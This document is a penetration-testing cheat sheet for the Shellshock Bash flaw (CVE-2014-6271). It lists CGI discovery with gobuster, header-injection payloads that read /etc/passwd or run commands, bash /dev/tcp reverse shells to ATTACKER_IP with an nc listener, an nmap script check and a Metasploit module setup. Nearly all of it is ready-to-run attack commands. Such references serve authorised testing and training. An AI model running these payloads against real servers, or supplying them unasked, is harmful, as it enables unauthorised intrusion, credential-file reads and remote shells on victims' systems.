# Shellshock (CVE-2014-6271)

## Overview

- Affects Bash versions up to 4.3
- Exploits improper handling of environment variables
- Common in CGI scripts, IoT devices

---

## Discovery

### Find CGI Scripts

```bash
gobuster dir -u http://TARGET/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi,sh,pl

# Common CGI paths
/cgi-bin/
/cgi-sys/
/cgi-mod/
```

### Common Vulnerable Scripts

```
/cgi-bin/test.cgi
/cgi-bin/status
/cgi-bin/admin.cgi
/cgi-bin/test-cgi
/cgi-bin/printenv
```

---

## Test for Vulnerability

### Via User-Agent Header

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://TARGET/cgi-bin/script.cgi
```

### Via Cookie Header

```bash
curl -H 'Cookie: () { :; }; echo ; /bin/id' http://TARGET/cgi-bin/script.cgi
```

### Via Referer Header

```bash
curl -H 'Referer: () { :; }; echo ; /bin/id' http://TARGET/cgi-bin/script.cgi
```

---

## Exploitation

### Command Execution

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/id' http://TARGET/cgi-bin/script.cgi
```

### Reverse Shell

```bash
# Bash reverse shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' http://TARGET/cgi-bin/script.cgi

# With listener
nc -lvnp PORT
```

### Alternative Reverse Shell

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c "/bin/bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"' http://TARGET/cgi-bin/script.cgi
```

---

## Nmap Script

```bash
nmap -sV -p 80,443,8080 --script http-shellshock --script-args uri=/cgi-bin/script.cgi TARGET
```

---

## Metasploit

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS TARGET
set TARGETURI /cgi-bin/script.cgi
set LHOST ATTACKER_IP
run
```

---

## Local Test

```bash
# Check if Bash is vulnerable
env x='() { :;}; echo vulnerable' bash -c "echo test"

# If "vulnerable" prints first, system is affected
```
